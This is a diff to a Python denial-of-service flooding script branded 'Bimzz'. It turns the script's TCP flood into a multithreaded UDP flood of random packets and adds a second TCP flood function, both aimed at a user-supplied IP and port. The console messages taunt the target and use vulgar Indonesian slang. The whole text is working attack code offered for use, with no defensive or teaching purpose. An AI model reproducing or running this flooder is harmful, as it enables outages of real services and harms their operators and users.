@@ -24,23 +24,40 @@ times = int(input("[Bimzz] PACKETS : "))
 threads = int(input("[Bimzz] THREADS (9024) : "))
 
 os.system("clear")
-print("[Bimzz] | Sabar Kontol...")
+print("[Bimzz] => [Wait 3s] => [Loading 3 Detik] => | Sabar Kontol...")
 time.sleep(3)
 def run():
-    data = random._urandom(9024)
-    i = random.choice(("[*]","[!]","[#]"))
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip,port))
-            s.send(data)
-            for x in range(times):
-                s.send(data)
-            print(i +" Attacking By Bimzz To IP => ",ip," PORT : ",port," !")
-        except socket.error:
-            s.close()
-            print("[!] Down Yah? Awokswoksawoks Cuakzz..")
+	data = random._urandom(1490)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Attacking By Bimzz To IP => ",ip," PORT : ",port," !")
+		except:
+			print("[!] Down Yah? Awokswoksawoks Cuakzz.. ")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Attacking By Bimzz To IP => ",ip," PORT : ",port," !")
+		except:
+			s.close()
+			print("[*] Down Yah? Awokswoksawoks Cuakzz.. ")
 
 for y in range(threads):
-    th = threading.Thread(target = run)
-    th.start()
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
